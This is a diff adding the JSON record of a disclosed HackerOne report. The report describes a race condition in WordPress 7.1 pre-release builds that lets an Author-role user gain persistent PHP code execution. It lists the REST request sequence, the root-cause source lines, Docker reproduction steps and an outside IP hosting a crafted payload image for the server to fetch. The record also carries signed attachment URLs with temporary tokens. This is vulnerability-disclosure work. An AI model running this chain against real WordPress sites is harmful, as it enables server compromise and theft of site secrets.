@@ -1,0 +1,134 @@
+{
+  "id": 3923967,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zOTIzOTY3",
+  "url": "https://hackerone.com/reports/3923967",
+  "title": "WordPress 7.1 Media Processing Race Enables Persistent PHP File Write and Author-to-RCE",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2026-08-07T16:46:51.630Z",
+  "submitted_at": "2026-08-07T16:46:52.221Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "mappymappy123",
+    "url": "/mappymappy123",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 55,
+    "url": "https://hackerone.com/wordpress",
+    "handle": "wordpress",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/055/f114d1d31f904e3b903cd99a6cf566bb531f8401_original.jpg/33193aed4df168c753cb4b15e6d5d8d6ba053ba5ee3e8d1478c137162601abe9",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/055/f114d1d31f904e3b903cd99a6cf566bb531f8401_original.jpg/e68529859b080f77ebfd9e0a1acafdf062bd4c43f1db58e7e55c81e6ceae2d0d"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "WordPress",
+      "twitter_handle": "wordpress",
+      "website": "https://wordpress.org/",
+      "about": "Beautiful sites of any kind."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": true,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2026-10-21T20:04:47.645Z",
+  "bug_reporter_agreed_on_going_public_at": "2026-10-21T12:30:22.972Z",
+  "team_member_agreed_on_going_public_at": "2026-10-21T20:04:47.456Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi Wordpress security team,\n\nWe are submitting this report in good faith and in the best interest of preventing this issue from shipping in the upcoming WordPress 7.1 release. \n\nThe vulnerability is not present on the current WordPress 7.0 branch (7.0.3), , while we have confirmed it in the WordPress 7.1 development line from Beta 2 through the current development source build we tested (7.1-RC2-63095-src).\n\nWordPress 7.1 is currently scheduled for release on August 19, 2026. We are therefore reporting this before the final release so the issue can be reviewed before it reaches stable users.\n\nIf issues affecting pre-release/development versions are considered outside the scope of the HackerOne program, we respectfully ask that you allow us to withdraw/close the report from our side rather than resolving it as N/A.\n\n### Pre-condition \nFor the demonstrated direct-HTTP execution path, WordPress's selected temporary directory must be located under a PHP-served path.\n\nIf `/tmp` is **not writable** by the user running PHP, WordPress can fall back to another writable temporary directory. In our Docker reproduction, making `/tmp` non-writable for the PHP user causes WordPress to fall back to the `wp-content` directory.\n\nWe simulate this condition in Docker by making `/tmp` writable only by `root`.\n\nOne deployment scenario where this condition can occur is a containerized environment using `readOnlyRootFilesystem`, depending on how `/tmp` is mounted and configured. If `/tmp` is not provided as a writable `tmpfs`/`emptyDir` for the web/PHP user, WordPress may select another writable fallback directory.\n\n### Vulnerability \n\nUnder the validated preconditions, an authenticated user with the default Author role can exploit a race condition to achieve persistent arbitrary PHP execution.\n\nBy combining the media finalization, URL-media sideload, and image post-processing flows, the attacker can cause WordPress/Imagick to generate persistent image files with a .php extension while the image XMP metadata contains valid PHP code.\n\nThe race condition leading to RCE involves three REST actions in addition to the initial image upload.\n\n**Step 1**\n\nFirst, an image is uploaded using:\n\n```http\nPOST /wp-json/wp/v2/media?generate_sub_sizes=false\n```\n\n**Step 2**\n\nCall:\n\n```http\nPOST /wp-json/wp/v2/media/{id}/finalize\n```\n\nThis poisons the seed attachment metadata so `original_image` points to the attacker-chosen temporary `.php` path.\n\n**Step 3**\n\nCall:\n\n```http\nPOST /wp-json/wp/v2/media\n```\n\nwith the `url` parameter.\n\nThis causes WordPress to fetch the attacker-controlled JPEG. A remote `Content-Disposition` header causes the predictable `.php` basename to temporarily exist in WordPress's selected temporary directory.\n\nRace the above request with:\n\n```http\nPOST /wp-json/wp/v2/media/{id}/post-process?action=create-image-subsizes\n```\n\nThe `/post-process` request races image processing against the temporary `.php` JPEG. When the race succeeds, Imagick opens the file as an image and WordPress generates persistent `.php` image derivatives.\n\n\n### Vulnerable Version\n\nAffected: WordPress `7.1-RC2-63095-src` — confirmed\n\nAlso reproduced in the WordPress 7.1 development line beginning with Beta 2.\n\nNot affected: current WordPress 7.0 branch (`7.0.3-src`) in our testing.\n\n\n###  Root cause of vulnerability : \n\n1) `/wp-json/wp/v2/media` - the URL-media flow downloads an attacker-controlled remote image through `download_url()`. `download_url()` honors the remote `Content-Disposition: attachment; filename=malicious.php` value and renames the local temporary file to that attacker-influenced basename, allowing a valid image to briefly exist with an executable extension such as `.php`. \n\n    [URL-media calls download_url() — lines 625–638](https://github.com/WordPress/wordpress-develop/blob/3ca084eb3399222a08cc0573278eed6be0f80714/src/wp-includes/rest-api/endpoints/class-wp-rest-attachments-controller.php#L634-L640)\n\n2) `/wp-json/wp/v2/media/{seed_id}/post-process?action=create-image-subsizes` races against the temporary file and invokes `wp_update_image_subsizes()` - which obtains the original-image path from attachment metadata and passes it into the image editor. \n\n    [Original path consumed for sub-size generation ](https://github.com/WordPress/wordpress-develop/blob/3ca084eb3399222a08cc0573278eed6be0f80714/src/wp-admin/includes/image.php#L159-L162) If the extension does not identify a known MIME type, `wp_get_image_editor()` deliberately allows the selected image editor to determine the format from the file contents instead of rejecting it based on extension. The derivative filename generator reuses the source extension when no replacement extension is supplied, allowing `.php` to propagate into generated sub-size filenames. \n\n    [Derivative extension reuse](https://github.com/WordPress/wordpress-develop/blob/3ca084eb3399222a08cc0573278eed6be0f80714/src/wp-includes/class-wp-image-editor.php#L435-L461) \n\n3) `/wp-json/wp/v2/media/{id}/finalize` allows attacker-controlled filename/path metadata to be persisted and later treated as a trusted local image path. The route accepts `file` and `original_image` as unrestricted strings, and `finalize_item()` directly assigns the supplied `original_image` into attachment metadata without sufficient validation. \n\n    [Finalize route schema](https://github.com/WordPress/wordpress-develop/blob/3ca084eb3399222a08cc0573278eed6be0f80714/src/wp-includes/rest-api/endpoints/class-wp-rest-attachments-controller.php#L211-L212) \n    \n    [Direct original_image metadata assignment](https://github.com/WordPress/wordpress-develop/blob/3ca084eb3399222a08cc0573278eed6be0f80714/src/wp-includes/rest-api/endpoints/class-wp-rest-attachments-controller.php#L2937-L2942) \n\n\n---\n### Steps to Reproduce \n\n1. Clone the WordPress development repository and check out the exact tested source revision:\n\n   ```bash\n   git clone https://github.com/WordPress/wordpress-develop.git\n   cd wordpress-develop\n   git checkout 3ca084eb3399222a08cc0573278eed6be0f80714\n   ```\n\n   Verify the version in:\n\n   ```text\n   wordpress-develop/src/wp-includes/version.php\n   ```\n\n   Expected version:\n\n   ```text\n   7.1-RC2-63095-src\n   ```\n\n   WP version bump commit:\n\n   https://github.com/WordPress/wordpress-develop/commit/3ca084eb3399222a08cc0573278eed6be0f80714\n\n2. Install dependencies:\n\n   ```bash\n   npm install\n   ```\n\n3. Build WordPress:\n\n   ```bash\n   npm run build:dev\n   ```\n\n4. Start the Docker environment:\n\n   ```bash\n   npm run env:start\n   ```\n\n5. Install WordPress:\n\n   ```bash\n   npm run env:install\n   ```\n\n6. Create an Author user:\n\n   ```bash\n   npm run env:cli -- user create attacker attacker@example.com \\\n     --role=author \\\n     --user_pass='Password123!'\n   ```\n\n7. Verify the user was created:\n\n   ```bash\n   npm run env:cli -- user list\n   ```\n\n8. Make `/tmp` non-writable for non-root users:\n\n   ```bash\n   docker exec -u root wordpress-develop-php-1 chmod 755 /tmp\n   ```\n\n9. Verify the `/tmp` permissions:\n\n   ```bash\n   docker exec -u root wordpress-develop-php-1 ls -ld /tmp\n   ```\n\n   Expected permissions should resemble:\n\n   ```text\n   drwxr-xr-x\n   ```\n\n10. From the directory containing the reproducer, run:\n\n    ```bash\n    python3 race_poc.py\n    ```\n\n    The PoC uses the crafted image payload hosted at:\n\n    ```text\n    http://140.245.237.219/payload.jpg\n    ```\n\n    The file is approximately 50 MB and contains PHP code inside its image metadata that executes:\n\n    ```php\n    phpinfo();\n    ```\n\n    as proof of PHP code execution.\n\n11. To generate the crafted image payload locally instead, use the attached generator:\n\n    ```bash\n    python3 gen_payload.py\n    ```\n\n    Ensure the generated file is served with the following HTTP response headers:\n\n    ```http\n    Content-Type: image/jpeg\n    Content-Disposition: attachment; filename=\"payload.php\"\n    ```\n\n## Impact\n\nUnder the validated preconditions, an attacker with a default Author account can achieve persistent remote code execution on the WordPress server.\n\nSuccessful exploitation creates PHP-executable image derivatives that:\n\n- Persist after the temporary source file is deleted.\n- Can be invoked over HTTP without authentication.\n- Execute with the privileges of the PHP/web-server user.\n- May expose database credentials, authentication salts, private files, and other application secrets.\n- Can enable database manipulation, administrator account creation, content compromise, malware persistence, and lateral movement.\n\nThe demonstrated RCE requires Imagick, a PHP-served writable temporary directory, PHP execution in the resulting location, and successful exploitation of the race window.",
+  "weakness": {
+    "id": 70,
+    "name": "Code Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 6417699,
+      "file_name": "poc_race.py",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/sbb5e8q5jc0bkefnep9tviycdsvz?response-content-disposition=attachment%3B%20filename%3D%22poc_race.py%22%3B%20filename%2A%3DUTF-8%27%27poc_race.py&response-content-type=application%2Fx-sh&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZYXBLRYK%2F20261021%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20261021T220530Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFE547XCpsbRJViDdrTsmrsv9cWB6bKGCz%2FTR28I1ownAiEAxgDm%2FoYZHISzAzoiMymRt4VtmymARFFWo0YWwnzeYd8qsgUIYRADGgwwMTM2MTkyNzQ4NDkiDFEt02yuMncCgDCEMSqPBSW6KDwZWgbkXiv9txcckkbkz7ggw8gmKmUMBI4p%2F5YtXpaIjWxxD7cZNc5evuQzTijny%2BhDXvgSh7UKw0MJmOlHEfH8bbU6nanwZi32BNYJRpRzyvBG2KL1o%2BUeh6a713qlwOpeMvgzEf8HLfGptFdmpfdXJxdNWbUIzNp32360XcmGT7UiYqSfvjJLpW0TwYv0BV6un6QRvsyKFw%2BRhZ4BmTiBMoH5IjyZ9MhXRNUd2KrMMptS0CVVOtoYavG8a2xmxGHPRS67nP%2Bm5oD562HGDoPOU9o3mJsUvalB0qYDSZsi7w%2FAU9%2BtNo%2F13J1h5i9nSVAcWhvsunrdQRFFeXaiDuAPEn%2FQ%2FZrboLFJ2%2FHh8n5CdC2tdwpfCN3RZgaI7tonemEqYT0NaBVPE1MVBn%2BKviHnMxCGtnZSJyiJJAg0Gh5WXwsutu7RNKnCUwkgJb1q2R74748ZEG8wZyTHuvE%2BW3EE%2FS2VP6daFV6hkDfMRhVun2ukwMRWStshD6opTzuf2tbgIEqatDi926dN%2BXS4ZEWKx05WKLJ5wcJjewoS70b5OvRa3SEK3u25BkLsF7BF2VM0xzutr%2FUj%2B4VgG5vK2REn5lj7mgu4Ko5t3Tet8BuC8V6pKlfR5lqJ0yuIJdVDuemDlbQGys8UlRPPdSvCaB0VBu95Zsb7kLhY9Sq8%2BL3JfOgQO%2FStKdzBAK1w4i61QNyYRCyWm1ZhNewYOpVe9ZZaT7LNMlGFTCQB20Y7vDCLNGx6X4lv%2FkQpwhRnbnQ28QYnr2h2XSkqJIiFEnOOjn63sgzopp147PWdN%2BtD8oQfFZshib8ZaENdbraIoylEs1c8mLTtUv7EOfBPkE4n0ubB6PplG7GN0YIqadkwiuLj1gY6sQEbe9WgAi3Xa0iPeEbO%2Bl63w9hliwP6PdzPTuurhzrC9k1Fk6n2gz0qhoZbyVo0dxD4f3zoXLewCTER3TPgFdliWMXwSl0Vo%2BqD5t0T9DTIICbC0cQKlAGAf5%2B7fLH%2FQI8uBHsf%2BBa6KHee1sYMIhA3FiEnddaqDw1epSBg8hIIpCyfasYFmie2FBd0u%2B2CNB3Aio4rElbDcGzJi7szjXUtPOwLkr7D7lii2RH%2FzqHDCSQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=04988d6f3f3e2382b580b66935d8ec127386e588d4d0b796e87969761465fbb3",
+      "file_size": 7292,
+      "type": "application/x-sh",
+      "moderated": null
+    },
+    {
+      "id": 6417701,
+      "file_name": "payload.jpg",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/qjeon3p143ne30m92q06w9cihc7a?response-content-disposition=attachment%3B%20filename%3D%22payload.jpg%22%3B%20filename%2A%3DUTF-8%27%27payload.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZYXBLRYK%2F20261021%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20261021T220530Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFE547XCpsbRJViDdrTsmrsv9cWB6bKGCz%2FTR28I1ownAiEAxgDm%2FoYZHISzAzoiMymRt4VtmymARFFWo0YWwnzeYd8qsgUIYRADGgwwMTM2MTkyNzQ4NDkiDFEt02yuMncCgDCEMSqPBSW6KDwZWgbkXiv9txcckkbkz7ggw8gmKmUMBI4p%2F5YtXpaIjWxxD7cZNc5evuQzTijny%2BhDXvgSh7UKw0MJmOlHEfH8bbU6nanwZi32BNYJRpRzyvBG2KL1o%2BUeh6a713qlwOpeMvgzEf8HLfGptFdmpfdXJxdNWbUIzNp32360XcmGT7UiYqSfvjJLpW0TwYv0BV6un6QRvsyKFw%2BRhZ4BmTiBMoH5IjyZ9MhXRNUd2KrMMptS0CVVOtoYavG8a2xmxGHPRS67nP%2Bm5oD562HGDoPOU9o3mJsUvalB0qYDSZsi7w%2FAU9%2BtNo%2F13J1h5i9nSVAcWhvsunrdQRFFeXaiDuAPEn%2FQ%2FZrboLFJ2%2FHh8n5CdC2tdwpfCN3RZgaI7tonemEqYT0NaBVPE1MVBn%2BKviHnMxCGtnZSJyiJJAg0Gh5WXwsutu7RNKnCUwkgJb1q2R74748ZEG8wZyTHuvE%2BW3EE%2FS2VP6daFV6hkDfMRhVun2ukwMRWStshD6opTzuf2tbgIEqatDi926dN%2BXS4ZEWKx05WKLJ5wcJjewoS70b5OvRa3SEK3u25BkLsF7BF2VM0xzutr%2FUj%2B4VgG5vK2REn5lj7mgu4Ko5t3Tet8BuC8V6pKlfR5lqJ0yuIJdVDuemDlbQGys8UlRPPdSvCaB0VBu95Zsb7kLhY9Sq8%2BL3JfOgQO%2FStKdzBAK1w4i61QNyYRCyWm1ZhNewYOpVe9ZZaT7LNMlGFTCQB20Y7vDCLNGx6X4lv%2FkQpwhRnbnQ28QYnr2h2XSkqJIiFEnOOjn63sgzopp147PWdN%2BtD8oQfFZshib8ZaENdbraIoylEs1c8mLTtUv7EOfBPkE4n0ubB6PplG7GN0YIqadkwiuLj1gY6sQEbe9WgAi3Xa0iPeEbO%2Bl63w9hliwP6PdzPTuurhzrC9k1Fk6n2gz0qhoZbyVo0dxD4f3zoXLewCTER3TPgFdliWMXwSl0Vo%2BqD5t0T9DTIICbC0cQKlAGAf5%2B7fLH%2FQI8uBHsf%2BBa6KHee1sYMIhA3FiEnddaqDw1epSBg8hIIpCyfasYFmie2FBd0u%2B2CNB3Aio4rElbDcGzJi7szjXUtPOwLkr7D7lii2RH%2FzqHDCSQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a5fb4eb7e97419ab3c373049cd33e2dae163330f2e2d77a53b7c0fee084cd757",
+      "file_size": 50000000,
+      "type": "image/jpeg",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2026-11-20T12:30:23.174Z",
+  "allow_singular_disclosure_after": 2557492.603065205,
+  "singular_disclosure_allowed": false,
+  "vote_count": 3,
+  "voters": [
+    "zy9ard3",
+    "audion",
+    "samir_xp"
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 2750,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "WordPress Core",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
